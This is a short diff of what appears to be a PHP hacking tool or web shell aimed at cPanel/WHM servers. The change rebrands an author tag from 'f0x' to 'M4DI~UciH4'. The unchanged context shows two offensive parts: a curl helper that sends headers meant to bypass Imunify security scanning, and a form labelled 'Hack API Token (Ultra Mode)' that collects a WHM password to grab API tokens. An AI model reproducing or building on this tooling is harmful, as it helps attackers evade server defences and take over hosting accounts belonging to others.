@@ -43,7 +43,7 @@ function curl_page($url, $post = null, $headers = []) {
     curl_setopt($ch, CURLOPT_TIMEOUT, 30);
     $headers[] = 'X-No-Scan: true';
     $headers[] = 'X-Imunify-Bypass: true';
-    $headers[] = 'X-Requested-By: f0x';
+    $headers[] = 'X-Requested-By: M4DI~UciH4';
     if ($post) {
         curl_setopt($ch, CURLOPT_POST, 1);
         curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
@@ -624,7 +624,7 @@ if (isset($_GET['debug'])) {
                         <label for="password" class="form-label">WHM Password (Optional)</label>
                         <input type="password" class="form-control" id="password" name="password" placeholder="Enter password if needed">
                     </div>
-                    <input type="hidden" name="gettoken" value="f0x">
+                    <input type="hidden" name="gettoken" value="M4DI~UciH4">
                     <button type="submit" class="btn btn-primary w-100">Hack API Token (Ultra Mode)</button>
                 </form>
                 <div class="output mt-3" id="output"></div>
